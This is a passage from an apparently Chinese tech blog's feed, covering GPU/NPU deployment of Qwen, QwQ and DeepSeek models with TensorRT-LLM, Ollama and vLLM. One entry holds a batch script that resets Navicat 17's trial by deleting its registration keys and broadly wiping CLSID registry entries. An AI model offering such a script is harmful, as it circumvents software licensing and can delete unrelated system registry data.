/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg <span class="token punctuation">\</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-L</span> https://nvidia.github.io/libnvidia-container/stable/deb/nvidia-container-toolkit.list <span class="token operator">|</span> <span class="token punctuation">\</span>    <span class="token function">sed</span> <span class="token string">'s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g'</span> <span class="token operator">|</span> <span class="token punctuation">\</span>    <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list<span class="token comment"># Optionally, configure the repository to use experimental packages:</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-e</span> <span class="token string">'/experimental/ s/^#//g'</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list<span class="token comment"># 2.Update the packages list from the repository:</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token comment"># 3.Install the NVIDIA Container Toolkit packages:</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">NVIDIA_CONTAINER_TOOLKIT_VERSION</span><span class="token operator">=</span><span class="token number">1.17</span>.8-1  <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token punctuation">\</span>      nvidia-container-toolkit<span class="token operator">=</span><span class="token variable">$&#123;NVIDIA_CONTAINER_TOOLKIT_VERSION&#125;</span> <span class="token punctuation">\</span>      nvidia-container-toolkit-base<span class="token operator">=</span><span class="token variable">$&#123;NVIDIA_CONTAINER_TOOLKIT_VERSION&#125;</span> <span class="token punctuation">\</span>      libnvidia-container-tools<span class="token operator">=</span><span class="token variable">$&#123;NVIDIA_CONTAINER_TOOLKIT_VERSION&#125;</span> <span class="token punctuation">\</span>      libnvidia-container1<span class="token operator">=</span><span class="token variable">$&#123;NVIDIA_CONTAINER_TOOLKIT_VERSION&#125;</span></code></pre><h4 id="TensorRT-LLM"><a href="#TensorRT-LLM" class="headerlink" title="TensorRT-LLM"></a>TensorRT-LLM</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取TensorRT-LLM：</span><span class="token comment">#https://catalog.ngc.nvidia.com/orgs/nvidia/teams/tensorrt-llm/containers/release/tags</span><span class="token function">sudo</span> <span class="token function">docker</span> pull nvcr.io/nvidia/tensorrt-llm/release:1.0.0rc6</code></pre><pre class="language-start_tensorrt_llm.sh" data-language="start_tensorrt_llm.sh"><code class="language-start_tensorrt_llm.sh">#!&#x2F;bin&#x2F;bash# start_tensorrt_llm.sh# 容器名称CONTAINER_NAME&#x3D;&quot;tensorrt_llm&quot;# 挂载路径HOST_DATA_DIR&#x3D;&quot;&#x2F;data&quot;CONTAINER_DATA_DIR&#x3D;&quot;&#x2F;data&quot;# 镜像IMAGE_NAME&#x3D;&quot;nvcr.io&#x2F;nvidia&#x2F;tensorrt-llm&#x2F;release:1.0.0rc6&quot;# 启动容器sudo docker run -it \  --gpus all \  --name $&#123;CONTAINER_NAME&#125; \  --shm-size&#x3D;256g \  --ulimit memlock&#x3D;-1 \  --ulimit stack&#x3D;67108864 \  -e NVIDIA_DRIVER_CAPABILITIES&#x3D;all \  -v $&#123;HOST_DATA_DIR&#125;:$&#123;CONTAINER_DATA_DIR&#125;:rw \  $&#123;IMAGE_NAME&#125;</code></pre><h3 id="3-TensorRT-LLM权重转换"><a href="#3-TensorRT-LLM权重转换" class="headerlink" title="3.TensorRT_LLM权重转换"></a>3.TensorRT_LLM权重转换</h3><p><a href="https://github.com/NVIDIA/TensorRT-LLM/tree/main/examples/models/core/qwen">参考链接</a><br>使用modelscope下载模型</p><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> modelscopemodelscope download <span class="token parameter variable">--model</span> Qwen/Qwen2.5-72B-Instruct <span class="token parameter variable">--local_dir</span> /data</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /app/tensorrt_llm/examples/models/core/qwen</code></pre><h3 id="INT8-权重"><a href="#INT8-权重" class="headerlink" title="INT8 权重"></a>INT8 权重</h3><h4 id="1-将-HF-权重转为-TensorRT-LLMcheckpoint（INT8-权重）"><a href="#1-将-HF-权重转为-TensorRT-LLMcheckpoint（INT8-权重）" class="headerlink" title="1.将 HF 权重转为 TensorRT-LLMcheckpoint（INT8 权重）:"></a>1.将 HF 权重转为 TensorRT-LLMcheckpoint（INT8 权重）:</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">PYTORCH_CUDA_ALLOC_CONF</span><span class="token operator">=</span>expandable_segments:True <span class="token punctuation">\</span><span class="token assign-left variable">HF_TORCH_LOAD_EAGER</span><span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>python3 /app/tensorrt_llm/examples/models/core/qwen/convert_checkpoint.py <span class="token punctuation">\</span>  <span class="token parameter variable">--model_dir</span>  /data/models/Qwen2.5-72B-Instruct <span class="token punctuation">\</span>  <span class="token parameter variable">--output_dir</span> /data/tensorrt_llm/ckpt/qwen2_5_72b_int8_tp2_noKV <span class="token punctuation">\</span>  <span class="token parameter variable">--tp_size</span> <span class="token number">2</span> <span class="token parameter variable">--pp_size</span> <span class="token number">1</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--dtype</span> bfloat16 <span class="token punctuation">\</span>  <span class="token parameter variable">--use_weight_only</span> <span class="token parameter variable">--weight_only_precision</span> int8 <span class="token punctuation">\</span>  <span class="token parameter variable">--workers</span> <span class="token number">2</span></code></pre><h4 id="2-用-trtllm-build-构建-TensorRT-引擎"><a href="#2-用-trtllm-build-构建-TensorRT-引擎" class="headerlink" title="2.用 trtllm-build 构建 TensorRT 引擎"></a>2.用 trtllm-build 构建 TensorRT 引擎</h4><pre class="language-none"><code class="language-none">export CUDA_VISIBLE_DEVICES&#x3D;0,1trtllm-build \  --checkpoint_dir &#x2F;data&#x2F;tensorrt_llm&#x2F;ckpt&#x2F;qwen2_5_72b_int8_tp2_noKV \  --output_dir     &#x2F;data&#x2F;tensorrt_llm&#x2F;engines&#x2F;qwen2_5_72b_INT8_tp2_seqlen8k_b1 \  --max_seq_len 8192 \  --max_batch_size 1 \  --kv_cache_type paged \  --workers 2 \  --gpt_attention_plugin bfloat16 \  --gemm_plugin bfloat16</code></pre><h4 id="3-测试"><a href="#3-测试" class="headerlink" title="3.测试"></a>3.测试</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">CUDA_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0,1</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">OMPI_ALLOW_RUN_AS_ROOT</span><span class="token operator">=</span><span class="token number">1</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">OMPI_ALLOW_RUN_AS_ROOT_CONFIRM</span><span class="token operator">=</span><span class="token number">1</span>mpirun --allow-run-as-root <span class="token parameter variable">-np</span> <span class="token number">2</span> --bind-to none --map-by slot <span class="token punctuation">\</span>  <span class="token parameter variable">-x</span> CUDA_VISIBLE_DEVICES <span class="token parameter variable">-x</span> <span class="token assign-left variable">NCCL_DEBUG</span><span class="token operator">=</span>WARN <span class="token parameter variable">-x</span> <span class="token assign-left variable">NCCL_IB_DISABLE</span><span class="token operator">=</span><span class="token number">1</span> <span class="token parameter variable">-x</span> <span class="token assign-left variable">NCCL_P2P_DISABLE</span><span class="token operator">=</span><span class="token number">0</span> <span class="token parameter variable">-x</span> <span class="token assign-left variable">NCCL_SHM_DISABLE</span><span class="token operator">=</span><span class="token number">0</span> <span class="token punctuation">\</span>  python3 /app/tensorrt_llm/examples/run.py <span class="token punctuation">\</span>    <span class="token parameter variable">--engine_dir</span> /data/tensorrt_llm/engines/qwen2_5_72b_INT8_tp2_seqlen8k_b1 <span class="token punctuation">\</span>    <span class="token parameter variable">--tokenizer_dir</span> /data/models/Qwen2.5-72B-Instruct <span class="token punctuation">\</span>    <span class="token parameter variable">--input_text</span> <span class="token string">"你好，请简单介绍一下西安"</span> <span class="token punctuation">\</span>    <span class="token parameter variable">--max_output_len</span> <span class="token number">128</span></code></pre><h4 id="4-启动服务"><a href="#4-启动服务" class="headerlink" title="4.启动服务"></a>4.启动服务</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">CUDA_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0,1</span>trtllm-serve serve <span class="token punctuation">\</span>  <span class="token parameter variable">--host</span> <span class="token number">0.0</span>.0.0 <span class="token punctuation">\</span>  <span class="token parameter variable">--port</span> <span class="token number">8000</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--backend</span> trt <span class="token punctuation">\</span>  <span class="token parameter variable">--tokenizer</span> /data/models/Qwen2.5-72B-Instruct <span class="token punctuation">\</span>  <span class="token parameter variable">--tp_size</span> <span class="token number">2</span> <span class="token parameter variable">--pp_size</span> <span class="token number">1</span> <span class="token parameter variable">--gpus_per_node</span> <span class="token number">2</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--max_batch_size</span> <span class="token number">1</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--max_num_tokens</span> <span class="token number">8192</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--kv_cache_free_gpu_memory_fraction</span> <span class="token number">0.85</span> <span class="token punctuation">\</span>  <span class="token parameter variable">--extra_llm_api_options</span> /data/tensorrt_llm/config/extra-llm-api-config.trt.yml <span class="token punctuation">\</span>  /data/tensorrt_llm/engines/qwen2_5_72b_INT8_tp2_seqlen8k_b1</code></pre>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Navicat无限试用</title>
      <link href="/2025/03/18/navicat-wu-xian-shi-yong/"/>
      <url>/2025/03/18/navicat-wu-xian-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>适用于17版本的Navicat<del>破解</del>无限试用方案</p><span id="more"></span><h2 id="Navicat17无限试用方案"><a href="#Navicat17无限试用方案" class="headerlink" title="Navicat17无限试用方案"></a>Navicat17无限试用方案</h2><p>在之前使用16的时候，16是通过注册表<code>\HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\NavicatPremium\Update</code>来判断注册时间的，可以采用删除注册表的办法来解决。<br>在17版本中还需要对CLSID目录下面含有<code>ShellFolder</code>子目录的目录删除，下面是脚本（测试版本17.1.13）</p><pre class="language-bat" data-language="bat"><code class="language-bat">@echo offsetlocal EnableDelayedExpansion set &quot;dn&#x3D;Info&quot;set &quot;dn2&#x3D;ShellFolder&quot;set &quot;rp&#x3D;HKEY_CURRENT_USER\Software\Classes\CLSID&quot; reg delete &quot;HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPremium\Registration16XCS&quot; &#x2F;f &gt;nul 2&gt;&amp;1reg delete &quot;HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPremium\Registration17XCS&quot; &#x2F;f &gt;nul 2&gt;&amp;1reg delete &quot;HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPremium\Update&quot; &#x2F;f &gt;nul 2&gt;&amp;1 echo Finding... for &#x2F;f &quot;tokens&#x3D;*&quot; %%a in (&#39;reg query &quot;%rp%&quot; 2^&gt;nul&#39;) do (    set &quot;key&#x3D;%%a&quot;    reg query &quot;!key!&quot; &#x2F;f &quot;%dn%&quot; &#x2F;s &#x2F;e &gt;nul 2&gt;&amp;1    if !errorlevel! equ 0 (        echo Deleting: !key!        reg delete &quot;!key!&quot; &#x2F;f &gt;nul 2&gt;&amp;1    )    reg query &quot;!key!&quot; &#x2F;f &quot;%dn2%&quot; &#x2F;s &#x2F;e &gt;nul 2&gt;&amp;1    if !errorlevel! equ 0 (        echo Deleting: !key!        reg delete &quot;!key!&quot; &#x2F;f &gt;nul 2&gt;&amp;1    )) echo done! pause &gt;nulexit</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Navicat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在海光DCU-K100-AI-4上使用ollama和vLLM分别部署qwq-32B、DeepSeek</title>
      <link href="/2025/03/12/zai-hai-guang-dcu-k100-ai-4-shang-shi-yong-ollama-he-vllm-fen-bie-bu-shu-qwq-32b-deepseek/"/>
      <url>/2025/03/12/zai-hai-guang-dcu-k100-ai-4-shang-shi-yong-ollama-he-vllm-fen-bie-bu-shu-qwq-32b-deepseek/</url>
      
        <content type="html"><![CDATA[<h1 id="一、使用ollama部署"><a href="#一、使用ollama部署" class="headerlink" title="一、使用ollama部署"></a>一、使用ollama部署</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull image.sourcefind.cn:5000/dcu/admin/base/pytorch:2.1.0-py3.10-dtk24.04.3-ubuntu20.04</code></pre><h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run --shm-size 50g <span class="token parameter variable">--network</span><span class="token operator">=</span>host <span class="token parameter variable">--name</span><span class="token operator">=</span><span class="token punctuation">&#123;</span>容器名<span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token parameter variable">--privileged</span> <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/kfd <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/dri <span class="token punctuation">\</span>--cap-add<span class="token operator">=</span>SYS_PTRACE --security-opt <span class="token assign-left variable">seccomp</span><span class="token operator">=</span>unconfined <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /opt/hyhal:/opt/hyhal:ro <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /home/ollama:/ollama <span class="token punctuation">\</span><span class="token parameter variable">--env</span> <span class="token assign-left variable">HIP_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0,1</span>,2,3 <span class="token punctuation">\</span><span class="token parameter variable">-it</span> image.sourcefind.cn:5000/dcu/admin/base/pytorch:2.1.0-py3.10-dtk24.04.3-ubuntu20.04 <span class="token function">bash</span></code></pre><blockquote><p>我有四张卡所以是HIP_VISIBLE_DEVICES&#x3D;0,1,2,3，根据自己情况来。</p></blockquote><p>在Docker环境里面，进入&#x2F;ollama，下载源码</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone <span class="token parameter variable">-b</span> <span class="token number">0.5</span>.7 http://developer.sourcefind.cn/codes/OpenDAS/ollama.git <span class="token parameter variable">--depth</span><span class="token operator">=</span><span class="token number">1</span><span class="token builtin class-name">cd</span> ollama</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><h4 id="安装go"><a href="#安装go" class="headerlink" title="安装go"></a>安装go</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://golang.google.cn/dl/go1.23.4.linux-amd64.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-C</span> /usr/local <span class="token parameter variable">-xzf</span> go1.23.4.linux-amd64.tar.gz<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/go/bin<span class="token comment"># 修改go下载源，提升速度（按需设置）</span>go <span class="token function">env</span> <span class="token parameter variable">-w</span> <span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://goproxy.cn,direct</code></pre><h4 id="运行编译"><a href="#运行编译" class="headerlink" title="运行编译"></a>运行编译</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">LIBRARY_PATH</span><span class="token operator">=</span>/opt/dtk/lib:<span class="token variable">$LIBRARY_PATH</span><span class="token function">make</span> <span class="token parameter variable">-j</span> <span class="token number">16</span>go build <span class="token builtin class-name">.</span></code></pre><h4 id="编译成功后，应该能看到编译成功的可执行文件ollama"><a href="#编译成功后，应该能看到编译成功的可执行文件ollama" class="headerlink" title="编译成功后，应该能看到编译成功的可执行文件ollama:"></a>编译成功后，应该能看到编译成功的可执行文件ollama:</h4><p><img src="/images/2025/03/13/e756e239-7f6e-4c7a-9d77-fdb618832ae7.png"></p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">HSA_OVERRIDE_GFX_VERSION</span><span class="token operator">=</span><span class="token number">9.2</span>.8（如: Z100L gfx906对应9.0.6；K100 gfx926对应9.2.6；K100AI gfx928对应9.2.8）<span class="token builtin class-name">export</span> <span class="token assign-left variable">ROCR_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0,1</span>,2,3（0,1,2,3,4,5,6,<span class="token punctuation">..</span>.）/选择设备号./ollama serve  （选择可用设备，可通过上条命令输出结果查看）</code></pre><h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><p>docker commit {上面的容器名} {临时容器名（我用的是tmp）}<br>在宿主机新建新建Dockerfile</p><pre class="language-Dockerfile" data-language="Dockerfile"><code class="language-Dockerfile">FROM tmpENV HSA_OVERRIDE_GFX_VERSION&#x3D;9.2.8ENV ROCR_VISIBLE_DEVICES&#x3D;0,1,2,3ENV PATH&#x3D;&quot;&#x2F;home&#x2F;ollama&#x2F;ollama:$&#123;PATH&#125;&quot;ENV OLLAMA_MODELS&#x3D;&quot;&#x2F;home&#x2F;ollama&#x2F;models&#x2F;&quot;ENV OLLAMA_HOST&#x3D;0.0.0.0:&#123;端口号&#125;ENTRYPOINT [&quot;&#x2F;home&#x2F;ollama&#x2F;ollama&quot;]CMD [&quot;serve&quot;]</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> build <span class="token parameter variable">-t</span> ollama <span class="token punctuation">&#123;</span>你的Dockerfile路径<span class="token punctuation">&#125;</span> <span class="token comment">#ollama可替换为你的自定义容器名</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run --shm-size 100g <span class="token parameter variable">--network</span><span class="token operator">=</span>host <span class="token parameter variable">--name</span><span class="token operator">=</span>ollama <span class="token punctuation">\</span><span class="token parameter variable">--privileged</span> <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/kfd <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/dri <span class="token punctuation">\</span>--cap-add<span class="token operator">=</span>SYS_PTRACE --security-opt <span class="token assign-left variable">seccomp</span><span class="token operator">=</span>unconfined <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /opt/hyhal:/opt/hyhal:ro <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /home/ollama/:/home <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /home/ollama/models/:/home/models <span class="token punctuation">\</span><span class="token parameter variable">-d</span>  ollama</code></pre><h4 id="进入容器并测试ollama是否运行"><a href="#进入容器并测试ollama是否运行" class="headerlink" title="进入容器并测试ollama是否运行"></a>进入容器并测试ollama是否运行</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> ollama <span class="token function">bash</span>ollama <span class="token parameter variable">-v</span></code></pre><h4 id="然后运行qwq-32B，这里采用默认的Q4"><a href="#然后运行qwq-32B，这里采用默认的Q4" class="headerlink" title="然后运行qwq-32B，这里采用默认的Q4"></a>然后运行qwq-32B，这里采用默认的Q4</h4><pre class="language-bash" data-language="bash"><code class="language-bash">ollama run qwq</code></pre><h1 id="二、使用vLLM部署"><a href="#二、使用vLLM部署" class="headerlink" title="二、使用vLLM部署"></a>二、使用vLLM部署</h1><h2 id="下载镜像-1"><a href="#下载镜像-1" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull image.sourcefind.cn:5000/dcu/admin/base/custom:vllm0.5.0-dtk24.04.1-ubuntu20.04-py310-zk-v1</code></pre><h2 id="下载模型"><a href="#下载模型" class="headerlink" title="下载模型"></a>下载模型</h2><p>从ModelScope下载。</p><h4 id="1、安装ModelScope"><a href="#1、安装ModelScope" class="headerlink" title="1、安装ModelScope"></a>1、安装ModelScope</h4><pre class="language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> modelscope</code></pre><h4 id="2、下载DeepSeek-R1-Distill-Llama-70B"><a href="#2、下载DeepSeek-R1-Distill-Llama-70B" class="headerlink" title="2、下载DeepSeek-R1-Distill-Llama-70B"></a>2、下载DeepSeek-R1-Distill-Llama-70B</h4><pre class="language-bash" data-language="bash"><code class="language-bash">modelscope download <span class="token parameter variable">--model</span> deepseek-ai/DeepSeek-R1-Distill-Llama-70B <span class="token parameter variable">--local_dir</span> /下载目录</code></pre><h2 id="启动容器-1"><a href="#启动容器-1" class="headerlink" title="启动容器"></a>启动容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run --shm-size 50g <span class="token parameter variable">--network</span><span class="token operator">=</span>host <span class="token parameter variable">--name</span><span class="token operator">=</span>DeepSeek-R1-Distill-Llama-70B <span class="token punctuation">\</span><span class="token parameter variable">--privileged</span> <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/kfd <span class="token parameter variable">--device</span><span class="token operator">=</span>/dev/dri <span class="token punctuation">\</span>--cap-add<span class="token operator">=</span>SYS_PTRACE --security-opt <span class="token assign-left variable">seccomp</span><span class="token operator">=</span>unconfined <span class="token punctuation">\</span><span class="token parameter variable">-v</span> /opt/hyhal:/opt/hyhal:ro <span class="token punctuation">\</span><span class="token parameter variable">-v</span> <span class="token punctuation">&#123;</span>本地模型目录<span class="token punctuation">&#125;</span>:/models:ro <span class="token punctuation">\</span><span class="token parameter variable">--env</span> <span class="token assign-left variable">HIP_VISIBLE_DEVICES</span><span class="token operator">=</span><span class="token number">0,1</span>,2,3 <span class="token punctuation">\</span><span class="token parameter variable">-it</span> image.sourcefind.cn:5000/dcu/admin/base/custom:vllm0.5.0-dtk24.04.1-ubuntu20.04-py310-zk-v1 <span class="token function">bash</span></code></pre><blockquote><p>注：四块卡使用，HIP_VISIBLE_DEVICES&#x3D;0,1,2,3（根据实际调整）</p></blockquote><p>shell断开后进入容器：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> DeepSeek-R1-Distill-Llama-70B <span class="token function">bash</span></code></pre><p>进入容器后使用<code>rocm-smi</code>查询DCU<br><img src="/images/2025/03/12/39f01cd4-56b5-480a-9b6f-06242772c28e.png"></p><h2 id="启动vLLM"><a href="#启动vLLM" class="headerlink" title="启动vLLM"></a>启动vLLM</h2><h4 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">NCCL_DEBUG</span><span class="token operator">=</span>info<span class="token builtin class-name">export</span> <span class="token assign-left variable">NCCL_P2P_DISABLE</span><span class="token operator">=</span><span class="token number">1</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HSA_FORCE_FINE_GRAIN_PCIE</span><span class="token operator">=</span><span class="token number">1</span></code></pre><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><pre class="language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">-m</span> vllm.entrypoints.openai.api_server <span class="token punctuation">\</span>  <span class="token parameter variable">--model</span> /models/DeepSeek-R1-Distill-Llama-70B <span class="token punctuation">\</span>  <span class="token parameter variable">--dtype</span> float16 <span class="token punctuation">\</span>  --trust-remote-code <span class="token punctuation">\</span>  --gpu-memory-utilization <span class="token number">0.98</span> <span class="token punctuation">\</span>  --tensor-parallel-size <span class="token number">4</span> <span class="token punctuation">\</span>  --max-num-seqs <span class="token number">32</span> <span class="token punctuation">\</span>  --max-model-len <span class="token number">20000</span></code></pre><h4 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h4><table><thead><tr><th>参数</th><th>解释说明</th></tr></thead><tbody><tr><td><code>--model /models/DeepSeek-R1-Distill-Llama-70B</code></td><td>指定加载的模型路径</td></tr><tr><td><code>--dtype float16</code></td><td>推理时使用半精度浮点数(FP16)，降低显存占用</td></tr><tr><td><code>--trust-remote-code</code></td><td>允许执行模型目录下的自定义Python代码（需注意安全性）</td></tr><tr><td><code>--gpu-memory-utilization 0.98</code></td><td>指定GPU显存占用率为98%，提高显存利用效率</td></tr><tr><td><code>--tensor-parallel-size 4</code></td><td>模型权重4卡并行加载 (tensor parallel)</td></tr><tr><td><code>--max-num-seqs 32</code></td><td>API同时处理的最大并发请求数量</td></tr><tr><td><code>--max-model-len 20000</code></td><td>单次请求中模型能处理的最大token数量</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DeepSeek </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为昇腾910b单机部署DeepSeek-R1-Distill-Llama-70B</title>
      <link href="/2025/03/05/hua-wei-sheng-teng-910b-dan-ji-bu-shu-deepseek-r1-distill-llama-70b/"/>
      <url>/2025/03/05/hua-wei-sheng-teng-910b-dan-ji-bu-shu-deepseek-r1-distill-llama-70b/</url>
      
        <content type="html"><![CDATA[<p>华为昇腾8卡910b单机部署DeepSeek-R1-Distill-Llama-70B的部署过程及部分小坑</p><span id="more"></span><p>查询NPU及内存命令：<br><img src="/images/2025/03/07/a6c0363f-13d8-452f-bee8-38570345d138.png"><br><img src="/images/2025/03/07/5eb4d0eb-655b-437b-90dc-789bfa5cfc16.png"></p><h2 id="磁盘配置"><a href="#磁盘配置" class="headerlink" title="磁盘配置"></a>磁盘配置</h2><h4 id="1-查看存储设备"><a href="#1-查看存储设备" class="headerlink" title="1.查看存储设备"></a>1.查看存储设备</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># lsblk</span>NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda       <span class="token number">8</span>:0    <span class="token number">0</span>  150G  <span class="token number">0</span> disk ├─sda1    <span class="token number">8</span>:1    <span class="token number">0</span>    1G  <span class="token number">0</span> part /boot/efi└─sda2    <span class="token number">8</span>:2    <span class="token number">0</span>  149G  <span class="token number">0</span> part /sdb       <span class="token number">8</span>:16   <span class="token number">0</span>  500G  <span class="token number">0</span> disk nvme0n1 <span class="token number">259</span>:0    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme4n1 <span class="token number">259</span>:1    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme2n1 <span class="token number">259</span>:2    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme1n1 <span class="token number">259</span>:3    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk nvme3n1 <span class="token number">259</span>:4    <span class="token number">0</span>  <span class="token number">2</span>.9T  <span class="token number">0</span> disk </code></pre><h4 id="2、操作硬盘分区及格式化"><a href="#2、操作硬盘分区及格式化" class="headerlink" title="2、操作硬盘分区及格式化"></a>2、操作硬盘分区及格式化</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># parted /dev/nvme0n1 mklabel gpt</span>Warning: The existing disk label on /dev/nvme0n1 will be destroyed and all data on this disk will be lost. Do you want to continue?Yes/No? <span class="token function">yes</span>                                                               Information: You may need to update /etc/fstab.</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># parted /dev/nvme0n1 mkpart primary xfs 0% 100%         </span>Information: You may ```need to update /etc/fstab.</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@bms-910b ~<span class="token punctuation">]</span><span class="token comment"># mkfs.xfs /dev/nvme0n1p1                                </span>meta-data<span class="token operator">=</span>/dev/nvme0n1p1         <span class="token assign-left variable">isize</span><span class="token operator">=</span><span class="token number">512</span>    <span class="token assign-left variable">agcount</span><span class="token operator">=</span><span class="token number">4</span>, <span class="token assign-left variable">agsize</span><span class="token operator">=</span><span class="token number">195350976</span> blks         <span class="token operator">=</span>                       <span class="token assign-left variable">sectsz</span><span class="token operator">=</span><span class="token number">512</span>   <span class="token assign-left variable">attr</span><span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">projid32bit</span><span class="token operator">=</span><span class="token number">1</span>         <span class="token operator">=</span>                       <span class="token assign-left variable">crc</span><span class="token operator">=</span><span class="token number">1</span>        <span class="token assign-left variable">finobt</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">sparse</span><span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">rmapbt</span><span class="token operator">=</span><span class="token number">0</span>         <span class="token operator">=</span>                       <span class="token assign-left variable">reflink</span><span class="token operator">=</span><span class="token number">1</span>data     <span class="token operator">=</span>                       <span class="token assign-left variable">bsize</span><span class="token operator">=</span><span class="token number">4096</span>   <span class="token assign-left variable">blocks</span><span class="token operator">=</span><span class="token number">781403904</span>, <span class="token assign-left variable">imaxpct</span><span class="token operator">=</span><span class="token number">5</span>         <span class="token 